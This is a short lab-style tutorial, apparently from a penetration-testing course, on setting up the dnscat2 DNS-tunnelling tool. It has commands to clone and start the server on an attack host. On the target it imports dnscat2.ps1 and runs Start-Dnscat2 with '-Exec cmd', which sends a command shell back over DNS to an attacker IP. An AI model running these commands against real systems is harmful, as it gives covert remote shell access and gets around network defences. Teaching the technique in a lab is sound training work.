
### Setting Up & Using dnscat2

#### Cloning dnscat2 and Setting Up the Server

```ruby
git clone https://github.com/iagox86/dnscat2.git
```

```ruby
cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

#### Starting the dnscat2 server

```ruby
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```


Once the `dnscat2.ps1` file is on the target we can import it and run associated cmd-lets.

#### Importing dnscat2.ps1


```ruby
Import-Module .\dnscat2.ps1
```


After dnscat2.ps1 is imported, we can use it to establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server.


```ruby
Start-Dnscat2 -DNSserver 10.10.15.170 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```



#### Listing dnscat2 Options

We can list the options we have with dnscat2 by entering `?` at the prompt.


#### Interacting with the Established Session

```ruby
window -i 1
```



